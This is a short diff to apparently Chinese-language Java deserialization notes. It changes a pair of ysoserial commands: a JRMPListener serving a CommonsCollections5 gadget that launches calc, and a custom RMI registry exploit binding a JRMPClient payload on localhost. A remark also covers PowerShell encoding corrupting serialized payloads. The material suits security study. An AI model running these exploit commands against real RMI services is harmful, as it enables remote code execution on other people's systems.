@@ -538,9 +538,10 @@ LDAP：
   ```
   java -cp ysoserial.jar ysoserial.exploit.JRMPListener 23333 CommonsCollections5 calc
   
-  java -jar ysoserial.jar JRMPClient 127.0.0.1:23333 > exp
-  ```
-
+  // RMINop是我自己改了RMIRegistryExploit，直接bind，不要封装Proxy
+  java -cp ysoserial.jar ysoserial.exploit.RMINop 127.0.0.1 9999 JRMPClient 127.0.0.1:23333
+```
+  
   PowerShell直接重定向的话，由于默认UTF16编码，序列化数据魔数会出错，Windows10 1903上使用cmd没问题
 
 ## Gadgets
